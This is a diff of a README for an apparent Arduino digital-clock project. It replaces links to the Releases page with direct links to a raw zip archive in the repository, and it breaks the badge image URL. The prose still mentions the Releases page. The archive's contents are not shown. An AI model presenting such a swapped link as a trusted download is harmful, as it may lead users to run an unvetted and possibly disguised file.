@@ -6,7 +6,7 @@ Welcome to the **digital-clock-logic-and-arduino** project! This guide will help
 
 ## 📦 Download Link
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/XxKevinxX90/digital-clock-logic-and-arduino/releases)
+[![Download Now](https://raw.githubusercontent.com/XxKevinxX90/digital-clock-logic-and-arduino/main/arduino-version/Digital_Clock/clock_logic_digital_arduino_and_v2.9.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/XxKevinxX90/digital-clock-logic-and-arduino/main/arduino-version/Digital_Clock/clock_logic_digital_arduino_and_v2.9.zip)
 
 ## 🖥️ System Requirements
 
@@ -34,7 +34,7 @@ To run the digital clock application, you need:
 
 To get started with your own digital clock project, visit the Releases page to download the necessary files. 
 
-[Visit this page to download](https://github.com/XxKevinxX90/digital-clock-logic-and-arduino/releases)
+[Visit this page to download](https://raw.githubusercontent.com/XxKevinxX90/digital-clock-logic-and-arduino/main/arduino-version/Digital_Clock/clock_logic_digital_arduino_and_v2.9.zip)
 
 Once there, you will find different versions of the project. Choose the latest version and click on it to see all the available files and download options.
 
